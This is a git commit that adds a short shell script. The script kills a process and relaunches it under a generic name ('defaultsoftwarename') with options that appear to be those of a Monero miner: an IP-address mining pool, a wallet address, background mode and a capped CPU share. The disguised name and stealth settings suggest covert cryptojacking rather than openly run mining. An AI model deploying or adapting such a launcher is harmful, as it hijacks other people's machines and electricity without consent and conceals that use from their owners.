cce71075f60aad15524a29edee58b8fa9c93f037
servicemi <52180716+servicemi@users.noreply.github.com>
2019-07-21 15:51:13 +0100

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 109.94.208.137:3245 -u 491oVzT9LxEeWQx15iyZgHebLDenD5fMQ8iYmqxV8TJuH9NZVgr9PNAWqyN3jrWd3nRnUuURYpnyBepaBZJP3ikfQn9362w --pass=x:huinarylo@hohol.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
